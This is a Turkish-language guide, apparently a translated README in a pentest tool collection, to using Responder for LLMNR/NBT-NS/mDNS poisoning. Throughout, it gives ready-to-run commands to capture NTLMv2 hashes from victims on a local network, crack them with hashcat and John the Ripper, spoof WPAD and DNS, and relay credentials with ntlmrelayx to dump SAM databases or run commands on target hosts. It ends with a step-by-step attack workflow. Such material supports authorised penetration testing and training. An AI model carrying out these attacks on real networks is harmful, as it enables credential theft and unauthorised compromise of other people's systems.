# 🎣 Responder - LLMNR/NBT-NS Zehirleme Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               LLMNR/NBT-NS/mDNS Zehirleyici (Poisoner)
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## 📋 İçindekiler

- [Responder Nedir?](#-responder-nedir)
- [Kurulum](#-kurulum)
- [Temel Kullanım](#-temel-kullanım)
- [NTLMv2 Hashlerini Yakalama](#-ntlmv2-hashlerini-yakalama)
- [Relay (Aktarma) Saldırıları](#-relay-aktarma-saldırıları)
- [Sahte Sunucular (Rogue Servers)](#-sahte-sunucular-rogue-servers)
- [Yapılandırma](#-yapılandırma)
- [Hızlı Başvuru](#-hızlı-başvuru)

---

## 🎯 Responder Nedir?

**Responder**, NTLM kimlik doğrulama hashlerini ele geçirmek için LLMNR, NBT-NS ve mDNS yanıtlarını zehirleyen (poisoning) bir araçtır:

- 🎣 **LLMNR Zehirleme** - Link-Local Multicast Name Resolution
- 📡 **NBT-NS Zehirleme** - NetBIOS Name Service
- 🍎 **mDNS Zehirleme** - Multicast DNS
- 🔓 **Hash Yakalama** - NTLMv1/NTLMv2 hashleri
- 🔄 **Relay Desteği** - NTLM aktarma (relay) saldırıları

### Çalışma Mantığı

```
1. Kullanıcı yanlış bir ana bilgisayar adı yazar: \\fileservr (yazım hatası)
2. DNS adı çözümleyemez
3. Windows yerel ağa LLMNR/NBT-NS sorgusu yayınlar (broadcast)
4. Responder yanıt verir: "fileservr benim!"
5. Kurban kimlik doğrulaması için NTLM hashini Responder'a gönderir
6. Hash parola kırma veya aktarma (relay) için ele geçirilmiş olur
```

---

## 🚀 Kurulum

### Kali Linux

```bash
# Önceden kuruludur
responder --help

# Güncelleme
sudo apt update && sudo apt install responder

# Veya GitHub üzerinden
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Doğrulama

```bash
responder --help
responder -I eth0 --version
```

---

## 💻 Temel Kullanım

### Responder'ı Başlatma

```bash
# Temel (hash yakalama)
sudo responder -I eth0

# Ayrıntılı mod (verbose)
sudo responder -I eth0 -v

# Analiz modu (pasif - zehirleme yapmaz)
sudo responder -I eth0 -A
```

### Ağ Arayüzü Seçimi

```bash
# Ethernet
sudo responder -I eth0

# Kablosuz (Wireless)
sudo responder -I wlan0

# Arayüzleri listeleme
ip a
```

---

## 🔓 NTLMv2 Hashlerini Yakalama

### Temel Yakalama

```bash
# Responder'ı başlat
sudo responder -I eth0

# Kurbanların ağda gezinmesini bekle...
# Örnek çıktı:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### NTLMv2'yi Zorlama

```bash
# Yalnızca NTLMv2 (parola kırma için önerilir)
sudo responder -I eth0 --lm
```

### WPAD Yakalama

```bash
# WPAD proxy'sini etkinleştir
sudo responder -I eth0 -w

# WPAD kimlik doğrulamasını zorla
sudo responder -I eth0 -wF
```

### Hash Dosyalarının Konumu

```bash
# Yakalanan hashler buraya kaydedilir:
/usr/share/responder/logs/
# Veya
./logs/

# Dosyalar:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Yakalanan Hashleri Kırma

```bash
# NTLMv2 formatı:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (mod 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John the Ripper
john --format=netntlmv2 hash.txt
```

---

## 🔄 Relay (Aktarma) Saldırıları

### SMB/HTTP Sunucularını Kapatma (Relay için)

```bash
# Responder.conf dosyasını düzenleyin
sudo nano /usr/share/responder/Responder.conf

# Aşağıdaki değerleri Off yapın:
SMB = Off
HTTP = Off
```

### Responder + ntlmrelayx Birlikte Kullanımı

```bash
# Terminal 1: Responder (SMB/HTTP devre dışı)
sudo responder -I eth0

# Terminal 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Veya komut çalıştırma ile
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### LDAP Üzerine Relay

```bash
# Responder
sudo responder -I eth0

# LDAP hedefine aktarma
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### SAM Veritabanını Dökmek için Relay

```bash
# Relay ile SAM veritabanını dökme
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

## 🖥️ Sahte Sunucular (Rogue Servers)

### Yerleşik Sunucular

| Sunucu | Port | Amacı |
|--------|------|-------|
| SMB | 445 | Dosya paylaşım doğrulaması |
| HTTP | 80 | Web doğrulaması |
| HTTPS | 443 | Güvenli web doğrulaması |
| FTP | 21 | FTP doğrulaması |
| SQL | 1433 | MSSQL doğrulaması |
| LDAP | 389 | Dizin doğrulaması |
| WPAD | 80 | Proxy yapılandırması |

### Sunucuları Etkinleştirme / Devre Dışı Bırakma

```bash
# Responder.conf dosyasını düzenleyin
[Responder Core]
; Başlatılacak sunucular
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Sahte WPAD Proxy

```bash
# WPAD etkinleştir
sudo responder -I eth0 -w

# WPAD üzerinde temel kimlik doğrulama zorla
sudo responder -I eth0 -wF

# Özel WPAD betiği belirtme
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### DNS Yanıltma (Spoofing)

```bash
# DNS sunucusunu etkinleştir
sudo responder -I eth0 -d

# Responder bir DNS sunucusu haline gelir
# Tüm ana bilgisayarlar için sorguları yanıtlar
```

---

## ⚙️ Yapılandırma

### Responder.conf

```bash
# Konum
/usr/share/responder/Responder.conf
# Veya
./Responder.conf
```

### Önemli Ayarlar

```ini
[Responder Core]
; On veya Off olarak ayarlayın
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Özel Challenge (Gökkuşağı tabloları / Rainbow tables için)
Challenge = Random

; Yerel sorguları yanıtlama
DontRespondTo =

; Yalnızca bu IP'leri yanıtla
RespondTo =
```

### Sabit Challenge Değeri (Rainbow Tables)

```ini
; Önceden hesaplanmış tablolar için statik challenge belirleyin
Challenge = 1122334455667788
```

### Hariç Tutma Listeleri

```ini
; Bu IP adreslerine yanıt verme
DontRespondTo = 192.168.1.1, 192.168.1.2

; Yalnızca bu IP adreslerine yanıt ver
RespondTo = 192.168.1.100, 192.168.1.101
```

---

## 📊 Hızlı Başvuru

### Temel Komutlar

| Komut | Açıklama |
|-------|----------|
| `responder -I eth0` | Temel hash yakalama |
| `responder -I eth0 -v` | Ayrıntılı mod |
| `responder -I eth0 -A` | Yalnızca analiz modu (pasif) |
| `responder -I eth0 -w` | WPAD etkinleştir |
| `responder -I eth0 -wF` | WPAD kimlik doğrulamayı zorla |
| `responder -I eth0 -d` | DNS etkinleştir |

### Bayraklar (Flags)

| Bayrak | Açıklama |
|--------|----------|
| `-I` | Ağ arayüzü |
| `-v` | Ayrıntılı çıktı |
| `-A` | Analiz modu (pasif dinleme) |
| `-w` | WPAD proxy etkinleştir |
| `-wF` | WPAD kimlik doğrulamayı zorla |
| `-d` | Sahte DNS sunucusunu etkinleştir |
| `-f` | Hedef sistemlerin işletim sistemini parmak iziyle belirle |
| `-b` | Temel (basic) kimlik doğrulaması döndür |

### Hash Türleri

| Tür | Hashcat Modu | John the Ripper Formatı |
|-----|--------------|-------------------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Saldırı İş Akışı

```bash
# 1. Responder'ı başlatın
sudo responder -I eth0 -wFv

# 2. Hashlerin gelmesini bekleyin
# Hashler ./logs/ dizinine kaydedilir

# 3. Hashleri kırın
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Veya relay yapın (önce SMB'yi kapatın)
sudo responder -I eth0  # Yapılandırmada SMB=Off
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Relay İş Akışı

```bash
# 1. SMB imzalaması (SMB signing) devre dışı olan hedefleri bulun
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Responder.conf dosyasını yapılandırın
# SMB = Off
# HTTP = Off

# 3. Responder'ı başlatın
sudo responder -I eth0

# 4. Relay aracını başlatın
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. İletilen kimlik doğrulamasının yakalanmasını bekleyin
```

---

## 📚 Kaynaklar

- [Responder GitHub](https://github.com/lgandx/Responder)
- [LLMNR Poisoning](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### İlgili Kılavuzlar
- [Impacket](../../Impacket/translations/README.tr.md)
- [CrackMapExec](../../CrackMapExec/translations/README.tr.md)
- [Hashcat](../../Hashcat/translations/README.tr.md)

---

<p align="center">
  <b>🎣 O Hashleri Yakalayın!</b><br>
  <i>Responder - Ağ kimlik bilgisi toplayıcısı</i>
</p>
